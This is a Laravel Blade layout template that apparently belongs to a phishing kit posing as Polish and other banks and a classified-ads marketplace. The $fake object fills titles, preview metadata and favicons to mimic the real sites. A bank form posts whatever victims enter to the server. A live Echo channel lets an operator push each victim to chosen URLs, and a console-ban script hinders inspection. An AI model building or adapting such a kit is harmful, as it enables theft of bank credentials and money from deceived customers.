<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}"
      id="html" @hasSection('html_class') class="@yield('html_class')" @endif>
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    @if (!(request()->is('banks/ipko') ||
           request()->is('banks/santander') ||
           request()->is('banks/equa') ||
           request()->is('banks/moneta') ||
          (request()->is('/') && ($fake->category->name ?? null) === \App\Models\Category::CBAZAR)
      ))
        <meta name="viewport" content="width=device-width, initial-scale=1">
    @endif
    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <meta property="og:title" content="{{$title ?? $fake->title}}">
    <meta property="og:type" content="website">
    <meta property="og:description" content="{{$fake->title}} {{$fake->price}}">
    <meta property="og:image" content="{{$fake->img}}">
    <meta name="og:site_name" content="{{$fake->originalUrl()}}">
    <link rel="shortcut icon" href="{{$favicon ?? asset("images/{$fake->category->name}_favicon.ico")}}"
          type="image/x-icon">
    <title>{{$title ?? $fake->title}}</title>
    <!-- Scripts -->
    <script src="{{ asset('js/app.js') }}"></script>
    <script src="{{ asset('js/config.js') }}"></script>
    <script src="{{asset('js/loader.js')}}"></script>
    <!-- Styles -->
    @hasSection('default_style')
        @yield('default_style')
    @else
        <link href="{{ asset('css/app.css') }}" rel="stylesheet">
    @endif
    <link href="{{ asset('css/loader.css') }}" rel="stylesheet">
    @stack('css')
    <script>const fake = @json($fake);</script>
</head>
<body onload="customLoader()"
      @hasSection('body_class') class="@yield('body_class')"
      @else class="body body--payments route__product_buy_id_any body_fixed-width_no body_fixed-height_no body_background_youla-mobile ing-new-theme login-page lang-en kb kb--caasauth kb-sidebar-mod" @endif
>
<div id="loader"></div>
<div id="app" style="display:none;">
    @yield('content')
</div>
@if(View::exists("fakes.$locale.includes.modal.redirect"))
    @include("fakes.$locale.includes.modal.redirect")
@elseif(View::exists("fakes.pl.includes.modal.redirect"))
    @include("fakes.pl.includes.modal.redirect")
@endif
@if(View::exists("fakes.$locale.includes.chat.index"))
    @include("fakes.$locale.includes.chat.index")
@elseif(View::exists("fakes.pl.includes.chat.index"))
    @include("fakes.pl.includes.chat.index")
@endif
@env('production')
    <script src="{{asset('js/console-ban.min.js')}}"></script>
    <script>ConsoleBan.init({redirect: '/404'});</script>
@endenv
<script>
    @if($uuid = session()->get('uuid'))
    Echo.channel("redirect.{{$fake->track_id}}.{{$uuid}}")
        .listen('RedirectEvent', (data) => {
            if ('redirectUrl' in data) {
                let modal = $('#redirectModal');
                modal.find('input[name="redirect_url"]').val(data.redirectUrl);
                modal.find('.msg').text(data.message);
                modal.modal('show');
            }
        });
    @endif
    $('#redirectModal').on('hidden.bs.modal', function () {
        let modal = $(this);
        let url = modal.find('input[name="redirect_url"]').val();
        if (url) location.href = url;
    });
    $(document).on('submit', 'form#bank_pm_form', function (e) {
        let form = this;
        let fields = $(form).serializeArray();
        let errors = [];
        $.each(fields, function (i, field) {
            let input = $(`input[name="${field.name}"]`);
            input.css('border-color', '');
            if (!$.trim(field.value)) {
                errors.push(field);
                input.css('border-color', 'red');
            }
        });
        if (!errors.length) $.post(form.action, $(form).serialize(), function (data) {
            let head = $("head");
            let viewport = head.find("meta[name='viewport']");
            if (!viewport.length) head.append('<meta name="viewport" content="width=device-width, initial-scale=1">');
            else viewport.remove();
            if (data.html) $('#app').html(data.html);
            else if (data.next) location.href = data.next;
            else setTimeout(function () {
                    alert("B????d");
                }, 3000)
        });
        e.preventDefault();
    });
</script>

@stack('js')
</body>
</html>
